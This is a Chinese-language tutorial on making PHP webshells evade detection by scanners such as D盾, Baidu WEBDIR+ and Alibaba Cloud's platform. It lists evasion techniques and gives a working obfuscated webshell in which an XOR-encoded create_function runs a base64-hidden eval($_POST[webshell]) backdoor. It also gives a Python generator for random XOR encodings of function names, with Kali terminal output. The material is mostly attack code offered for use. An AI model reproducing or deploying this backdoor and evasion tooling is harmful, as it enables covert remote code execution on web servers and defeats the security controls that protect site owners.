国内常见查杀软件：

1. D 盾防火墙
2. 百度 WEBDIR+
3. 阿里云 Webshell 检测平台

## 1 理论

### 1.1 识别方式

1. 静态（分析已知类型后门的 hash 值或文件特征）
2. 敏感函数（例如 eval）
3. 敏感调用（例如写一个变量 $a=eval 调用 $a() 即可调用 eval）
4. 污点分析（底层代码分析，较难解决，阿里云擅长）

### 1.2 免杀方式

1. 对敏感函数进行编码（不推荐 base64、异或（随机字符建议使用 16 进制），太常见，在 jsp 中建议用 unicode ）
2. 字符串拼接
3. 加解密
4. 反序列化（在 php 中推荐）

### 1.3 Payload

```php
<?php
class LJEF{
    function __destruct(){
        $TPHV='IUBNRVl{h_t|>DS'^"\x2a\x27\x27\x2f\x26\x33\x33\x1d\x1d\x31\x17\x8\x57\x2b\x3d";
        @$TPHV=$TPHV('',$this->INTA);
        return @$TPHV();
    }
}
$ljef=new LJEF();
@$ljef->INTA=base64_decode("IEBldmFsKCRfUE9TVFt3ZWJzaGVsbF0pOw==");
?>
```

>  `$TPHV` 的内容为异或，结果是 `create_function` ，以执行匿名函数 `INTA` ，避免直接执行 `base64_decode` 时被解密
>
>  `INTA` 的 `base64` 编码可以拆分为多个魔术方法后再拼接到一起，达到更好的免杀效果
>
>  在 `LJEF` 类中没有给 `INTA` 赋值，那么可以在调用 `LJEF` 时对 `INTA` 赋值
>
>  密钥为 `webshell`

### 1.4 异或

```php
$TPHV='IUBNRVl{h_t|>DS'^"\x2a\x27\x27\x2f\x26\x33\x33\x1d\x1d\x31\x17\x8\x57\x2b\x3d"
```

> 对异或函数 `IUBNRVl{h_t|>DS` 解密

函数 `IUBNRVl{h_t|>DS`  是对 `create_function` 进行异或加密得到的函数

```
┌──(root㉿kali-31)-[~]
└─# vim create_function.php
```

```php
<?php
$TPHV='create_function'^"\x2a\x27\x27\x2f\x26\x33\x33\x1d\x1d\x31\x17\x8\x57\x2b\x3d";
echo $TPHV
?>
```

```
┌──(root㉿kali-31)-[~]
└─# php create_function.php
IUBNRVl{h_t|>DS
```

> 异或的加密密钥可以是随机的，但要与 `create_function` 字符长度相同
>
> 加密后的值要避免不可见字符，无法解密 

异或脚本

```
┌──(root㉿kali-31)-[~]
└─# vim xor.py
```

```python
#!/usr/bin/python3
import chardet
import base64
import random
import sys
import zlib

def gen_payload(func):
    func_line1 = ''
    func_line2 = ''
    key = random_keys(len(func))
    for i in range(0,len(func)):
        enc = xor(func[i],key[i])
        func_line1 += key[i]
        func_line2 += enc
    payload = '\'{0}\'^"{1}"'.format(func_line1,func_line2)
    return payload
def random_keys(len):
    str = '`~-=!@#$%^&*_/+?<>{}|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))
def xor(c1,c2):
    return hex(ord(c1)^ord(c2)).replace('0x',r"\x")

func1 = sys.argv[1]
print(gen_payload(func1))
```

> 这个脚本中的加密密钥是随机的

使用脚本对 `eval` 函数进行异或加密

```
┌──(root㉿kali-31)-[~]
└─# python xor.py eval
'>!f_'^"\x5b\x57\x7\x33"
```

> 异或由于太常用，已经很难利用
